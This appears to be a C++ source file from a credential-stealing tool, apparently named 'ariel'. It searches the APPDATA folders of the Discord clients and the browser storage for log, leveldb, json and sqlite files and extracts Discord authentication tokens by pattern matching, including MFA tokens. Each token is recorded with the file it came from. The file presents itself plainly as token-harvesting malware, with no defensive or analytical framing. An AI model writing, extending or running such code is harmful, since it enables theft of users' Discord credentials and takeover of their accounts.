#include "discord.hpp"

#include "browser.hpp"
#include "util.hpp"

#include <algorithm>
#include <cstdint>
#include <unordered_set>

namespace ariel::discord {

namespace {

bool token_char(const char c) {
    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
           (c >= '0' && c <= '9') || c == '-' || c == '_';
}

size_t run_length(const std::string_view data, const size_t start) {
    size_t length = 0;
    while (start + length < data.size() && token_char(data[start + length])) ++length;
    return length;
}

bool candidate_extension(const std::wstring& extension) {
    static const std::vector<std::wstring> allowed = {
        L"", L".log", L".ldb", L".txt", L".json", L".sqlite", L".db", L".dat"};
    return std::find(allowed.begin(), allowed.end(), extension) != allowed.end();
}

void scan_file(const util::fs::path& path,
               std::unordered_set<std::string>& seen,
               std::vector<hit>& out,
               size_t& scanned) {
    std::error_code error;
    const uintmax_t size = util::fs::file_size(path, error);
    if (error || size == 0 || size > 16u * 1024u * 1024u) return;

    std::vector<uint8_t> bytes;
    if (!util::read_file(path, bytes)) return;
    ++scanned;

    const std::string_view data(reinterpret_cast<const char*>(bytes.data()), bytes.size());
    std::string source = util::narrow_path(path);
    if (source.size() > 160) source = source.substr(source.size() - 160);

    for (auto& token : find_tokens(data)) {
        if (!seen.insert(token).second) continue;
        out.push_back({source, token});
    }
}

}  // namespace

std::vector<std::string> find_tokens(const std::string_view data) {
    std::vector<std::string> found;
    size_t i = 0;
    while (i < data.size()) {
        if (data.substr(i, 4) == "mfa." && (i == 0 || !token_char(data[i - 1]))) {
            const size_t start = i + 4;
            const size_t length = run_length(data, start);
            const size_t end = start + length;
            if (length == 84 && (end == data.size() || !token_char(data[end]))) {
                found.push_back(std::string(data.substr(i, end - i)));
                i = end;
                continue;
            }
        }

        if (token_char(data[i]) && (i == 0 || !token_char(data[i - 1]))) {
            const size_t first = run_length(data, i);
            if (first >= 23 && first <= 28 && i + first < data.size() && data[i + first] == '.') {
                const size_t second_start = i + first + 1;
                const size_t second = run_length(data, second_start);
                if (second >= 6 && second <= 7 && second_start + second < data.size() &&
                    data[second_start + second] == '.') {
                    const size_t third_start = second_start + second + 1;
                    const size_t third = run_length(data, third_start);
                    const size_t end = third_start + third;
                    if (third >= 27 && third <= 64 &&
                        (end == data.size() || !token_char(data[end]))) {
                        found.push_back(std::string(data.substr(i, end - i)));
                        i = end;
                        continue;
                    }
                }
            }
        }
        ++i;
    }
    return found;
}

void collect_into(std::vector<hit>& out, std::vector<std::string>& warnings) {
    std::unordered_set<std::string> seen;
    std::vector<util::fs::path> roots;

    const util::fs::path appdata = util::environment(L"APPDATA");
    if (!appdata.empty()) {
        for (const wchar_t* name : {L"discord", L"discordcanary", L"discordptb",
                                    L"discorddevelopment"})
            roots.push_back(appdata / name);
    }
    auto extra = browser::storage_paths();
    roots.insert(roots.end(), extra.begin(), extra.end());

    size_t scanned = 0;
    for (const auto& root : roots) {
        std::error_code error;
        if (!util::fs::exists(root, error)) continue;
        if (util::fs::is_regular_file(root, error)) {
            scan_file(root, seen, out, scanned);
            continue;
        }
        for (auto it = util::fs::recursive_directory_iterator(root, error);
             !error && it != util::fs::recursive_directory_iterator(); it.increment(error)) {
            if (scanned >= 20000) break;
            if (!it->is_regular_file(error)) continue;
            if (!candidate_extension(it->path().extension().wstring())) continue;
            scan_file(it->path(), seen, out, scanned);
        }
    }
    if (scanned == 0) warnings.push_back("Discord: no candidate token stores found");
}

std::vector<hit> collect(std::vector<std::string>& warnings) {
    std::vector<hit> out;
    collect_into(out, warnings);
    return out;
}

}  // namespace ariel::discord
